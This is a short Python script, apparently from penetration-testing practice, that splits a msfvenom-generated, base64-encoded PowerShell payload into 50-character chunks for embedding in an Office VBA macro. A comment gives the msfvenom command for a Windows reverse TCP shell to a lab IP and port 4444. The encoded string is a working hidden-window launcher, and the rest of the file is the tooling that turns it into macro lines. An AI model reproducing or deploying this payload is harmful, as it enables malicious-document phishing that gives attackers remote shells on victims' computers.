#example script to turn msfvenom payload into macro 50 char limit output
#msfvenom -p windows/shell_reverse_tcp LHOST=172.16.177.10 LPORT=4444 -f hta-psh -o evil.hta

str = ('powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnAH0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGkAcgArACcAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQA7ACQAcwA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAUwB0AGEAcgB0AEkAbgBmAG8AOwAkAHMALgBGAGkAbABlAE4AYQBtAGUAPQAkAGIAOwAkAHMALgBBAHIAZwB1AG0AZQBuAHQAcwA9ACcALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAJgAoAFsAcwBjAHIAaQBwAHQAYgBsAG8AYwBrAF0AOgA6AGMAcgBlAGEAdABlACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJwAnAEgANABzAEkAQQBFAC8ATABoADEANABDAEEANwBWAFcAYQAyAC8AYQBTAEIAVAA5AG4ARQBqADUARAAxAGEARgBaAEYAcwBpAHYATQBJADIAVABhAFIASwBhAC8ATQAwAHcAUQBuAGcAWQBBAEkAVQBWAFIATgA3AGIARQA4AFkAZQA4AGgANAB6AEsAdgBiAC8ANwA3AFgAWQBLAGUAcABtAHUANgAyAEsANgAwAEYAWQBqAHgAegBuACsAZQBlAGUAdwBjAHYAaQBSAHgAQgBXAEMAUQA5AFAANwBlAGwATAAyAGUAbgBKAHcAUABFAFUAUwBnAHAAaABlAEQAegBUAFYARQBxAG8ARABzACsAKwBxAEMAZQBuAE0AQgBCAEkAWABLAHQAVABWAFAANgBLAEMAbAB6AGIAYgBWAHEAcwBoAEMAUgBhAEgARgA5ADMAVQBnADQAeAA1AEUANAB2AHAAYwA2AFcARwBoAHgAagBNAE4ASABTAG4AQwBzAHEATgBKAGYAMABpAFQAQQBIAEoALwBmAFAAVAA1AGgAUgAwAGgAZgBwAE0ATABuAFUAbwBlAHkAUgAwAFEAegBzAFYAMABEAE8AUQBHAFcAegByAFgASQBUAGMALwA2AHoARQBGAHAATwBDAFYAcgBSAFkAbABRADUARQArAGYAWgBIAFYAKwBYAGwAMgBVAFcAcwA4AEoAbwByAEUAaQBXADcAdABZADQATABEAGsAVQBpAHEAcgAwAGwAYwAxAGQAWABpAC8AVwAyAEYARgBOAG8AbgBEAFcAYwB3ADgAVQBaAHEAUQA2AEsASgBXAEcAawBjAHgAOAB2AEEAdABXAEYAdABqAEUANAB1AEEAdQBiAEcAcwBRAGgAcgB3ADQAVgBnAGsAUABKAEsATwBDAGEAVQBXAGoAdQBlAEsARABNAHMAQgBaADQANwBtAHUAaAB6AEgAcwBWAHkAVQA1AHEAbgB0ACsAVwBMAHgAcAB6AEwAUABIAEkAKwBTAFMASgBBAFEAbAA0AHgASQBZAE0ANQBXAEYAdQBaAHIANAB1AEMANAAxAEUAVwBSAFMALwBFAEkAZQB3AHYAUQBzAGcAUQBuAGsAYgA5AFEAVgBSAEIAYgBzAHkAVgBXAEMAbABGAEMAYQBWAEgANgBIAFQAUABLAEwAZAA3AGsAcwBQADIAcQBrAHYASgBhAEMAYQBRAEcAZwBxAHQARgBxAE8AVgBiAGkAWgByAE0AVABTAGcAKwBxAHMAcAB2AFIASgBvAFMAUQBJAFgAbgBoAFEAUQBBADMAdABlAHoAMAA3AE4AVABMADIAYwBNADIAcQBQAEsAYQA4AHIAQQA2AG0AUgArAFcARwBPAEkAVAB4AG0AdwBtAEIAegBrAFAAawBxAFYAbwBtAFMAQwBJAHkAUQBZADMAOABGAHIANABaADQAbgBXAEYAMgA4AG8AQwBzAFYAcwBGAHYAOAB1AFgAWQAxAEYAdwBYAEIAOQBlAGMAQQBkAHUAWQAyAEkAKwA0AEMATgBMAEsAQwBGAGsAUwB2AFAAcgBsAFAARAAzADcATwB6AEMAYgAyAFMASQBTAGIAdQB3AGkARgB4AE0AbgBKAHAANwB5AEYATQB2AFkAbwBQAG0AUgBZAHkAcwBWAHUASQBTAGgARgB6AGcANgB3ADIAOABRAFUAKwAwAGkAawBzAEsAWABGAC8AawBHAHQARgBSAEwAeABvAHEAcwBuAGgATABxAFkAYQB3ADUAVQBLAG8AYQBvAG8ASQBqAHEAOQA4AEUAYwBLADYASABJAFIAbQBUAGkARQBCAEEANgB2AGcAUAA3AEMAaAA1AFEASAB1AGYAUwBHAGMAMQAzAHUAZgBmADAASABZAFQAawBCAGsAVgB4AFgASgBRAEcAQwBmAFMAYwBVADUAUQBzAGoAQwBqAEEASwBXAGwAUgBUAEwASQBqAEwAUgBIAHMAcwBKAFMALwBoAFcAcwBtAFYAQgBBAEgAeABTAEkAMwB0ADEAQgBmAGcATQB3AGMATgBsAGcAVQBDADUANAA0AFUARABWAEkALwB0ADUAYQBZAFkAYwBnAG0AbQBKAFIAbABMAHIARQB4AGYAcgBPAEkAbgA3AHUAVwBIADQAVABpAFEAYQBpAEYARABvAEIATABLADIAaABFAHIAQwBUAEkAbQBDAEoAbABBAHMAYwBZAG8AUwA2AHEAeQBVAEwAQwB5AE4AYwBVAFIAeQBDAHgASwBIADMAMgB4AFQANQAwAE8AawBaADIAdwAvAFUAUQBUADUAMgA1AFIAOABDAHoATgBsADgAcABHADYASwBSAFEANwBDAHEALwBDAGcAdwBCAFoAbABvAGkAagBaAGgAQQB1AFkASQBTAG0AdQB3AEsATAAvADQAdgB6AFYANgBEAGkARwAwAGUAQQA0AEsANABTAFMAZAA4AGQAYwAzADQAbQBVADAAdwBWADMAWQA2AFMARQB6AEQAQQA1AEkATQBBAEYAWgBOAC8AbQBMAE4AUgBSAGoATgAvAFgAagAxAE4AQwBlAFYAZQArAEkAdwAwAE4AbgBxAGsAUgBVAGQAUABSAGwANgBTAHEAYgBVAGoAVgBNAE8ARQA3AEoAaABjAEcAYQAxADYANgBOADcAMgBuAGIAcABrADMAdAA0AEcAbgBHAGIARgBoAGQAZwBmAE4AWQBiAGQAYgBYAC8AYwBzAHUAeQA2AHMAbABpAEYAdQBCAG8AWQB3AFcAdwA5AFAAVAA1AGIAVwBIAFkAMgBuAFkAbQBaAG8AMwBYAHQAUwBXAFUANwByACsAMQBXAFAANwBLADIAKwA1AGsANgAzADUAZgBkADcAZgBiACsAcAA2AE4AdgA5AGsAKwA5ADYAMAA2AGIAbgArAFoAZQBlAE4AYQByACsAMABTAGIAOQBTAFcATwBvAFYAMgBxAG8AMwAyAHcAbAAvAFkAbQArADAAUwB2ADEAdQBFAFUAMgAzAFMARQBaAEQANQBlADkAdABuAGkAYwAyAGgAUwBOAHYAYgBMAC8AVQBMADEAQwBaAE4AdgBuAFQAMwBhAFYAbQBYAHQARAAwAHoAcgBCAGgAYgBQAHYAZQBYAFkAbgBNAE4AMwBkAHQARgB1ACsAbQB0AFMAWABXAGsAdgBUAEcAbABIAEwAYgB1AHYAcwBaAHEAcAB6AGIAVgBDADIAeAAyADEAOQBPAEcANwBwAHcAeQBIAHMAdgBmAGYATABYAGgAMwAyAGEASQAyADEAMABjADEAbQBHAEEAOQBYAFQAUABPADEAMABZAE0AUgBoAFMAagBRAEoAMwBhAE4AegBGAFkAUABvAHcAQgBzAHQAUwBFAEUAcwAxAHkAcABHAHkANwBlAHMAZwAvADkAQwBiAEgAWABaAFIAdAAxAGIAcwBWAE0AYQAvAFQAcQBWAGYAZgBCADMAbgBkAHIASwBPAGoATgA3AEsAUgAvAE4AWQB2AGQAVgBxACsANQAwAGIAVgBwAHQAZABYAFQAbQB4ADIAdABOAFIAcQBQADIANwBPAEoAdgBaAHgATgA3AHUAbABzAE0AcQA3AE8ARwBIAFkAMgA1AFEAQgBzAEUASwB6AGYAMgBjAHYASABzAHQAbgB4AGoAVwBCAGIAOQBjAEgAWAA1AGMARgArAFMARQBMADYAVwBIAFAATABWACsATQBQAGUAcgBTADUAOABRAGQAcgAzAHgAMQBPAEwAawBmAGIAMgA5ADEAagBqAFcAbgBqAGMAdABsACsAbAAzAEkAQgB5AEYAQwBnAEYAawBlAHYAYQB2AHkAegA4AFcAdwBpAEgAZwBlAEkAUQB1ADEAaAA3AE8AYgB0ADEAbQBhADgAbgBRADMAUwBBAFMATwBwAGgAcQBLAGsAVgAvAEEAUwA4AHcAaABUAHUATAAvAGcAaABzAHMAcABxADEASABLAG4ASABTAFEASAB5AFkAdQBYAEMATABIADAAWgA3AGUATgBHAE4AWQBYAHQAVABlAFgASwBuAFMAaQA2AEQANgBiAGIANwBuAFcAOQBmAFgATQB3AGcAUwB1AGcAQgA0AFcAdQByAGoAeQBCAGQAQgBzAGIASwA5AHEARgBSAGcAVgBsAGUAMgA5AFEAcgBrACsATwB0ADUATgBkAGgAcQBwADYAUwBXAGkAdQBtAG8AUAArAEMAUwBXAGEAWQBIAHkAMgByAGEARwBZAFUAdwBFAHYAOAByAFcAbABrADMAQgB2AEQAagAvAGgAdABhADMALwBiACsANABmAFMAWABFAEsAdwBVAGoALwBuACsAcwBQADMAOQB4AG0ALwBoACsAYgB1AFoAVAB4AEEAUgBJAEcAagBCAE8ASwBIADQAZQBKAHUAOQBEAFUARABHAGoARgBmAFgAUABSAFEARgA2AHUANQBsAFQALwBxAEgANwBTADQAUgA1ADcAZgB3AEoAKwBEAHMAOQBHAC8AeABLAHQASgBBAEgAQQBvAEEAQQBBAD0APQAnACcAKQApACkALABbAFMAeQBzAHQAZQBtAC4ASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQApACkAJwA7ACQAcwAuAFUAcwBlAFMAaABlAGwAbABFAHgAZQBjAHUAdABlAD0AJABmAGEAbABzAGUAOwAkAHMALgBSAGUAZABpAHIAZQBjAHQAUwB0AGEAbgBkAGEAcgBkAE8AdQB0AHAAdQB0AD0AJAB0AHIAdQBlADsAJABzAC4AVwBpAG4AZABvAHcAUwB0AHkAbABlAD0AJwBIAGkAZABkAGUAbgAnADsAJABzAC4AQwByAGUAYQB0AGUATgBvAFcAaQBuAGQAbwB3AD0AJAB0AHIAdQBlADsAJABwAD0AWwBTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAXQA6ADoAUwB0AGEAcgB0ACgAJABzACkAOwA="')


n = 50

for i in range(0, len(str), n):
    print ("Str = Str + " '"' + str[i:i+n] + '"')